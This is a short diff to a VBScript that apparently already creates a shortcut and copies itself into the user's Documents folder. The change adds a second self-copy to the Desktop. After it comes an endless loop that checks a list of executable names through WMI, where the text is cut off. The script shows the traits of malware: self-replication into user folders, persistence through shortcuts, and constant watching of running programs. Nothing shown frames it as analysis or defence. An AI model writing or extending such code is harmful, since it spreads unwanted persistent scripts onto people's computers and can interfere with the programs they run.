@@ -12,6 +12,10 @@ objShellLink.Save
 strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
 fso.CopyFile WScript.ScriptFullName, strDocumentsPath & "\" & fso.GetFileName(WScript.ScriptFullName), True
 
+' Copy script to Desktop folder
+strDesktopPath = WshShell.SpecialFolders("Desktop")
+fso.CopyFile WScript.ScriptFullName, strDesktopPath & "\" & fso.GetFileName(WScript.ScriptFullName), True
+
 Do
     For Each strExeName In strExeNames
         Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
